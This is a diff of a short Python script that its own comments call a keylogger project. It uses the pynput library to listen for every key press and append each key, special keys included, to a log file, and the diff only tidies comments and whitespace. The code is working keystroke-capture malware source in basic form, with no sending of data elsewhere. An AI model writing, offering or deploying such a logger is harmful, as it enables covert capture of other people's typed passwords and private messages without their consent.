@@ -1,5 +1,6 @@
 # We are going to start working on the keylogger project.
 # Let's get started
+
 from pynput import keyboard
 
 def keypressed(key):
@@ -13,10 +14,10 @@ def keypressed(key):
             # Handle special keys (like Shift, Ctrl, etc.)
             logkey.write(f'[{key.name}]')
 
-if __name__ == "__main__":  # Corrected this line
-    listener = keyboard.Listener(on_press=keypressed)  # Corrected 'listener' to 'Listener'
+if __name__ == "__main__": 
+    listener = keyboard.Listener(on_press=keypressed)
     listener.start()
-    listener.join()  # Wait for the listener to finish
+    listener.join() 
 
 
 
